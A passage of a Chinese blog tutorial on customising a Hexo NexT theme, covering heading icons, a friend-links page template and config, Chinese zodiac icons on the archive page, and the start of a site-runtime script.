class="line">/*修改h6前面图标*/</span><br><span class="line">.posts-expand .post-body h5:before &#123;</span><br><span class="line">  top: 10px;</span><br><span class="line">  width: 18px;</span><br><span class="line">  height: 18px;</span><br><span class="line">  content: &quot;🐅&quot;;</span><br><span class="line">  font-size: 18px;</span><br><span class="line">  line-height: 18px;</span><br><span class="line">  margin-right: 16px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可复制表情：<a href="http://www.fhdq.net/emoji/emojifuhao.html" rel="external nofollow" target="_blank">网站</a></p><h2 id="自定义友链页面"><a href="#自定义友链页面" class="headerlink" title="自定义友链页面"></a>自定义友链页面</h2><p> 在博客根目录 /source 下手动创建 links 文件夹和里边的 <code>index.md</code>文件 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 友情链接</span><br><span class="line">date: 2019-08-11 15:34:16</span><br><span class="line">type: &quot;links&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h3 id="配置-menu"><a href="#配置-menu" class="headerlink" title="配置 menu"></a>配置 menu</h3><p> 主题配置文件中<code>menu</code>下添加： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">links: /links/ || link</span><br></pre></td></tr></table></figure><p> 在 <code>/themes/next/languages/zh-Hans.yml</code> 文件中 <code>menu</code> 下增加中文描述 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">links: 友链</span><br></pre></td></tr></table></figure><h3 id="新增-links-swig-页"><a href="#新增-links-swig-页" class="headerlink" title="新增 links.swig 页"></a>新增 links.swig 页</h3><p>在 <code>/themes/next/layout/</code> 新建 <code>links.swig</code>，内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 所在目录：~/themes/next/layout/ --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">  &#123;######################&#125;</span><br><span class="line">  &#123;###  LINKS BLOCK   ###&#125;</span><br><span class="line">  &#123;######################&#125;</span><br><span class="line">  </span><br><span class="line">    &lt;div id=&quot;links&quot;&gt;</span><br><span class="line">        &lt;style&gt;</span><br><span class="line">            .links-content&#123;</span><br><span class="line">                margin-top:1rem;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            .link-navigation::after &#123;</span><br><span class="line">                content: &quot; &quot;;</span><br><span class="line">                display: block;</span><br><span class="line">                clear: both;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            .card &#123;</span><br><span class="line">                width: 240px;</span><br><span class="line">                font-size: 1rem;</span><br><span class="line">                padding: 10px 20px;</span><br><span class="line">                border-radius: 4px;</span><br><span class="line">                transition-duration: 0.15s;</span><br><span class="line">                margin-bottom: 1rem;</span><br><span class="line">                display:flex;</span><br><span class="line">            &#125;</span><br><span class="line">            @media (max-width: 767px) &#123;</span><br><span class="line">.card:nth-child(odd) &#123;</span><br><span class="line">                    float: left;</span><br><span class="line">                &#125;</span><br><span class="line">                .card:nth-child(even) &#123;</span><br><span class="line">                    float: left !important;</span><br><span class="line">                &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">            .card:nth-child(odd) &#123;</span><br><span class="line">                float: left;</span><br><span class="line">            &#125;</span><br><span class="line">            .card:nth-child(even) &#123;</span><br><span class="line">                float: right;</span><br><span class="line">            &#125;</span><br><span class="line">            .card:hover &#123;</span><br><span class="line">                transform: scale(1.1);</span><br><span class="line">                box-shadow: 0 2px 6px 0 rgba(0, 0, 0, 0.12), 0 0 6px 0 rgba(0, 0, 0, 0.04);</span><br><span class="line">            &#125;</span><br><span class="line">            .card a &#123;</span><br><span class="line">                border:none; </span><br><span class="line">            &#125;</span><br><span class="line">            .card .ava &#123;</span><br><span class="line">                width: 3rem!important;</span><br><span class="line">                height: 3rem!important;</span><br><span class="line">                margin:0!important;</span><br><span class="line">                margin-right: 1em!important;</span><br><span class="line">                border-radius:4px;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            .card .card-header &#123;</span><br><span class="line">                font-style: italic;</span><br><span class="line">                overflow: hidden;</span><br><span class="line">                width: 100%;</span><br><span class="line">            &#125;</span><br><span class="line">            .card .card-header a &#123;</span><br><span class="line">                font-style: normal;</span><br><span class="line">                color: #2bbc8a;</span><br><span class="line">                font-weight: bold;</span><br><span class="line">                text-decoration: none;</span><br><span class="line">            &#125;</span><br><span class="line">            .card .card-header a:hover &#123;</span><br><span class="line">                color: #a166ab;</span><br><span class="line">                text-decoration: none;</span><br><span class="line">            &#125;</span><br><span class="line">            .card .card-header .info &#123;</span><br><span class="line">                font-style:normal;</span><br><span class="line">                color:#a3a3a3;</span><br><span class="line">                font-size:14px;</span><br><span class="line">                min-width: 0;</span><br><span class="line">                overflow: hidden;</span><br><span class="line">                white-space: nowrap;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            span.focus-links &#123;</span><br><span class="line">                font-style: normal;</span><br><span class="line">                margin-left: 10px;</span><br><span class="line">                position: unset;</span><br><span class="line">                left: 0;</span><br><span class="line">                padding: 0 7px 0 5px;</span><br><span class="line">                font-size: 11px;</span><br><span class="line">                border-color: #42c02e;</span><br><span class="line">                border-radius: 40px;</span><br><span class="line">                line-height: 24px;</span><br><span class="line">                height: 22px;</span><br><span class="line">                color: #fff !important;</span><br><span class="line">                background-color: #42c02e;</span><br><span class="line">                display: inline-block;</span><br><span class="line">            &#125;</span><br><span class="line">            span.focus-links:hover&#123;</span><br><span class="line">                background-color: #318024;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            .friends-btn&#123;</span><br><span class="line">                text-align: center;</span><br><span class="line">                color: #555!important;</span><br><span class="line">                background-color: #fff;</span><br><span class="line">                border-radius: 3px;</span><br><span class="line">                font-size: 15px;</span><br><span class="line">                box-shadow: inset 0 0 10px 0 rgba(0,0,0,.35);</span><br><span class="line">                border: none!important;</span><br><span class="line">                transition-property: unset;</span><br><span class="line">                padding: 0 15px;</span><br><span class="line">                margin: inherit;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            .friends-btn:hover&#123;</span><br><span class="line">                color: rgb(255, 255, 255) !important;</span><br><span class="line">                border-radius: 3px;</span><br><span class="line">                font-size: 15px;</span><br><span class="line">                box-shadow: inset 0px 0px 10px 0px rgba(0, 0, 0, 0.35);</span><br><span class="line">                background-image: linear-gradient(90deg, #a166ab 0%, #ef4e7b 25%, #f37055 50%, #ef4e7b 75%, #a166ab 100%);</span><br><span class="line">                margin: inherit;</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">        &lt;div class=&quot;links-content&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;link-navigation&quot;&gt;</span><br><span class="line"></span><br><span class="line">                &#123;% for link in theme.mylinks %&#125;</span><br><span class="line">                </span><br><span class="line">                    &lt;div class=&quot;card&quot;&gt;</span><br><span class="line">                        &lt;img class=&quot;ava&quot; src=&quot;&#123;&#123; link.avatar &#125;&#125;&quot;/&gt;</span><br><span class="line">                        &lt;div class=&quot;card-header&quot;&gt;</span><br><span class="line">                        &lt;div&gt;&lt;a href=&quot;&#123;&#123; link.site &#125;&#125;&quot; target=&quot;_blank&quot;&gt; &#123;&#123; link.nickname &#125;&#125;&lt;/a&gt; &lt;a href=&quot;&#123;&#123; link.site &#125;&#125;&quot;&gt;&lt;span class=&quot;focus-links&quot;&gt;关注&lt;/span&gt;&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;info&quot;&gt;&#123;&#123; link.info &#125;&#125;&lt;/div&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                </span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &#123;&#123; page.content &#125;&#125;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">  </span><br><span class="line">  &#123;##########################&#125;</span><br><span class="line">  &#123;###   END LINKS BLOCK  ###&#125;</span><br><span class="line">  &#123;##########################&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><h3 id="修改-page-swig"><a href="#修改-page-swig" class="headerlink" title="修改 page.swig"></a>修改 page.swig</h3><p>修改 <code>/themes/next/layout/page.swig</code> 文件，在开头的 <code>block title</code> 内部</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#125;&#123;&#123; __(&apos;title.tag&apos;) + page_title_suffix &#125;&#125;&#123;#下方添加</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 友情链接--&gt;</span><br><span class="line">#&#125;&#123;% elif page.type === &apos;links&apos; and not page.title %&#125;&#123;#</span><br><span class="line">  #&#125;&#123;&#123; __(&apos;title.links&apos;) + page_title_suffix &#125;&#125;&#123;#</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/09/07/n1Q6RH.png" alt="参考"></p><h3 id="引入-links-swig"><a href="#引入-links-swig" class="headerlink" title="引入 links.swig"></a>引入 links.swig</h3><p>接着在 <code>/themes/next/layout/page.swig</code> 中 <code>PAGE BODY</code> 内部，引入刚才新建的 <code>page.swig</code> :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 友情链接--&gt;</span><br><span class="line">&#123;% elif page.type === &apos;links&apos; %&#125;</span><br><span class="line">    &#123;% include &apos;links.swig&apos; %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/09/07/n1MvPe.png" alt=""></p><h3 id="配置友链"><a href="#配置友链" class="headerlink" title="配置友链"></a>配置友链</h3><p>接下来，在 <code>/themes/next/_config.yml</code> 文件中配置友链，末尾处新增 <code>mylinks</code> ，如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 友链</span><br><span class="line">mylinks:</span><br><span class="line"></span><br><span class="line">- nickname: Stalker战队</span><br><span class="line">  avatar: https://lab.jxustctf.top/img/N407.jpg</span><br><span class="line">  site: https://lab.jxustctf.top/stalker.html</span><br><span class="line">  info: Stalker战队成员墙</span><br><span class="line">  </span><br><span class="line">- nickname: Daniel</span><br><span class="line">  avatar: https://danie1.jxustctf.top/img/2.png</span><br><span class="line">  site: https://danie1.jxustctf.top</span><br><span class="line">  info: Stalker战队知名带头大哥</span><br></pre></td></tr></table></figure><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>此处我将主题修改为了<code>scheme: Pisces</code></p><h2 id="参考文章-2"><a href="#参考文章-2" class="headerlink" title="参考文章"></a>参考文章</h2><p>1.<a href="https://leafjame.github.io/posts/2114475547.html" rel="external nofollow" target="_blank">北宸的博客</a></p><p>2.<a href="https://leafjame.github.io/posts/1123041323.html" rel="external nofollow" target="_blank">添加友链页面</a></p><p>3.<a href="https://sunhwee.com/posts/6e8839eb.html" rel="external nofollow" target="_blank">飘落特效</a></p><h1 id="博客DIY3-0"><a href="#博客DIY3-0" class="headerlink" title="博客DIY3.0"></a>博客<code>DIY3.0</code></h1><h2 id="归档页面加入-12-生肖"><a href="#归档页面加入-12-生肖" class="headerlink" title="归档页面加入 12 生肖"></a>归档页面加入 12 生肖</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1）下载字体：<a href="https://io-oi.me/uploads/chinese-zodiac.zip" rel="external nofollow" target="_blank">chinese-zodiac.zip (23.2KB)</a>，下载后将解压的三个字体文件全部放在 <code>~/blog/source/fonts/</code> 下（若无 <code>fonts</code> 文件夹请自建）。</p><p>2）新建文件：保存路径参考下文注释，文件名为<code>chinese-zodiac.swig</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 文件位置：~<span class="regexp">/blog/</span>themes/next/layout/_partials/chinese-zodiac.swig --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">if</span> year % <span class="number">12</span> == <span class="number">0</span> %&#125;</span><br><span class="line">&lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"symbolic-animals icon-monkey"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> year % <span class="number">12</span> == <span class="number">1</span> %&#125;</span><br><span class="line">&lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"symbolic-animals icon-rooster"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> year % <span class="number">12</span> == <span class="number">2</span> %&#125;</span><br><span class="line">&lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"symbolic-animals icon-dog"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> year % <span class="number">12</span> == <span class="number">3</span> %&#125;</span><br><span class="line">&lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"symbolic-animals icon-pig"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> year % <span class="number">12</span> == <span class="number">4</span> %&#125;</span><br><span class="line">&lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"symbolic-animals icon-rat"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> year % <span class="number">12</span> == <span class="number">5</span> %&#125;</span><br><span class="line">&lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"symbolic-animals icon-ox"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> year % <span class="number">12</span> == <span class="number">6</span> %&#125;</span><br><span class="line">&lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"symbolic-animals icon-tiger"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> year % <span class="number">12</span> == <span class="number">7</span> %&#125;</span><br><span class="line">&lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"symbolic-animals icon-rabbit"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> year % <span class="number">12</span> == <span class="number">8</span> %&#125;</span><br><span class="line">&lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"symbolic-animals icon-dragon"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> year % <span class="number">12</span> == <span class="number">9</span> %&#125;</span><br><span class="line">&lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"symbolic-animals icon-snake"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> year % <span class="number">12</span> == <span class="number">10</span> %&#125;</span><br><span class="line">&lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"symbolic-animals icon-horse"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> year % <span class="number">12</span> == <span class="number">11</span> %&#125;</span><br><span class="line">&lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"symbolic-animals icon-goat"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>3）修改文件：编辑<code>archive.swig</code> 文件，文件位置参考下面注释。删除(-)一行，增加(+)几行（复制粘贴后删除每行前面的 <code>+</code> 号）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 文件位置：~<span class="regexp">/blog/</span>themes/next/layout/archive.swig --&gt;</span><br><span class="line"></span><br><span class="line">          &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"collection-title"</span>&gt;</span><br><span class="line">-            <span class="xml"><span class="tag">&lt;<span class="name">&#123;%</span> <span class="attr">if</span> <span class="attr">theme.seo</span> %&#125;<span class="attr">h2</span>&#123;% <span class="attr">else</span> %&#125;<span class="attr">h1</span>&#123;% <span class="attr">endif</span> %&#125; <span class="attr">class</span>=<span class="string">"archive-year"</span> <span class="attr">id</span>=<span class="string">"archive-year-&#123;&#123; year &#125;&#125;"</span>&gt;</span>&#123;&#123; year &#125;&#125;<span class="tag">&lt;/<span class="name">&#123;%</span> <span class="attr">if</span> <span class="attr">theme.seo</span> %&#125;<span class="attr">h2</span>&#123;% <span class="attr">else</span> %&#125;<span class="attr">h1</span>&#123;% <span class="attr">endif</span> %&#125;&gt;</span></span></span><br><span class="line"><span class="xml">+            <span class="tag">&lt;<span class="name">&#123;%</span> <span class="attr">if</span> <span class="attr">theme.seo</span> %&#125;<span class="attr">h2</span>&#123;% <span class="attr">else</span> %&#125;<span class="attr">h1</span>&#123;% <span class="attr">endif</span> %&#125; <span class="attr">class</span>=<span class="string">"archive-year"</span> <span class="attr">id</span>=<span class="string">"archive-year-&#123;&#123; year &#125;&#125;"</span>&gt;</span></span></span><br><span class="line"><span class="xml">+              &#123;&#123; year &#125;&#125;</span></span><br><span class="line">+              &lt;div class="chinese-zodiac"&gt;</span><br><span class="line">+                &#123;% include '_partials/chinese-zodiac.swig' %&#125;</span><br><span class="line"><span class="xml">+              <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">+            <span class="tag">&lt;/<span class="name">&#123;%</span> <span class="attr">if</span> <span class="attr">theme.seo</span> %&#125;<span class="attr">h2</span>&#123;% <span class="attr">else</span> %&#125;<span class="attr">h1</span>&#123;% <span class="attr">endif</span> %&#125;&gt;</span></span></span><br><span class="line"><span class="xml">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>4）添加样式：将下面的 <code>CSS</code> 代码加入到 <code>custom.styl</code>。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 文件位置：~/blog/themes/next/source/css/_custom/custom.styl */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.chinese-zodiac</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: right;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">font-face</span> &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: <span class="string">'chinese-zodiac'</span>;</span><br><span class="line">  <span class="attribute">font-display</span>: swap;</span><br><span class="line">  <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">'/fonts/chinese-zodiac.eot'</span>);</span><br><span class="line">  <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">'/fonts/chinese-zodiac.eot'</span>) <span class="built_in">format</span>(<span class="string">'embedded-opentype'</span>),</span><br><span class="line">       <span class="built_in">url</span>(<span class="string">'/fonts/chinese-zodiac.woff2'</span>) <span class="built_in">format</span>(<span class="string">'woff2'</span>),</span><br><span class="line">       <span class="built_in">url</span>(<span class="string">'/fonts/chinese-zodiac.woff'</span>) <span class="built_in">format</span>(<span class="string">'woff'</span>);</span><br><span class="line">  <span class="attribute">font-weight</span>: normal;</span><br><span class="line">  <span class="attribute">font-style</span>: normal;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.symbolic-animals</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">font</span>: normal normal normal <span class="number">14px</span>/<span class="number">1</span> chinese-zodiac;</span><br><span class="line">  <span class="attribute">font-size</span>: inherit;</span><br><span class="line">  <span class="attribute">text-rendering</span>: auto;</span><br><span class="line">  <span class="attribute">-webkit-font-smoothing</span>: antialiased;</span><br><span class="line">  <span class="attribute">-moz-osx-font-smoothing</span>: grayscale;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-dragon</span><span class="selector-pseudo">:before</span> &#123; <span class="attribute">content</span>: <span class="string">'\e806'</span>; &#125;</span><br><span class="line"><span class="selector-class">.icon-tiger</span><span class="selector-pseudo">:before</span> &#123; <span class="attribute">content</span>: <span class="string">'\e809'</span>; &#125;</span><br><span class="line"><span class="selector-class">.icon-pig</span><span class="selector-pseudo">:before</span> &#123; <span class="attribute">content</span>: <span class="string">'\e810'</span>; &#125;</span><br><span class="line"><span class="selector-class">.icon-horse</span><span class="selector-pseudo">:before</span> &#123; <span class="attribute">content</span>: <span class="string">'\e813'</span>; &#125;</span><br><span class="line"><span class="selector-class">.icon-rat</span><span class="selector-pseudo">:before</span> &#123; <span class="attribute">content</span>: <span class="string">'\e816'</span>; &#125;</span><br><span class="line"><span class="selector-class">.icon-goat</span><span class="selector-pseudo">:before</span> &#123; <span class="attribute">content</span>: <span class="string">'\e818'</span>; &#125;</span><br><span class="line"><span class="selector-class">.icon-snake</span><span class="selector-pseudo">:before</span> &#123; <span class="attribute">content</span>: <span class="string">'\e820'</span>; &#125;</span><br><span class="line"><span class="selector-class">.icon-ox</span><span class="selector-pseudo">:before</span> &#123; <span class="attribute">content</span>: <span class="string">'\e822'</span>; &#125;</span><br><span class="line"><span class="selector-class">.icon-dog</span><span class="selector-pseudo">:before</span> &#123; <span class="attribute">content</span>: <span class="string">'\e825'</span>; &#125;</span><br><span class="line"><span class="selector-class">.icon-rabbit</span><span class="selector-pseudo">:before</span> &#123; <span class="attribute">content</span>: <span class="string">'\e826'</span>; &#125;</span><br><span class="line"><span class="selector-class">.icon-monkey</span><span class="selector-pseudo">:before</span> &#123; <span class="attribute">content</span>: <span class="string">'\e829'</span>; &#125;</span><br><span class="line"><span class="selector-class">.icon-rooster</span><span class="selector-pseudo">:before</span> &#123; <span class="attribute">content</span>: <span class="string">'\e82f'</span>; &#125;</span><br></pre></td></tr></table></figure><h3 id="参考文章-3"><a href="#参考文章-3" class="headerlink" title="参考文章"></a>参考文章</h3><p>具体细节或者其他报错，请参考：<a href="https://io-oi.me/tech/add-chinese-zodiac-to-next/" rel="external nofollow" target="_blank">博客</a></p><h2 id="侧边添加运行时间"><a href="#侧边添加运行时间" class="headerlink" title="侧边添加运行时间"></a>侧边添加运行时间</h2><p>在原来时间下面添加</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;# blogtime #&#125;</span><br><span class="line">&lt;span id=<span class="string">"span_dt_dt"</span>&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_date_time</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">window</span>.setTimeout(<span 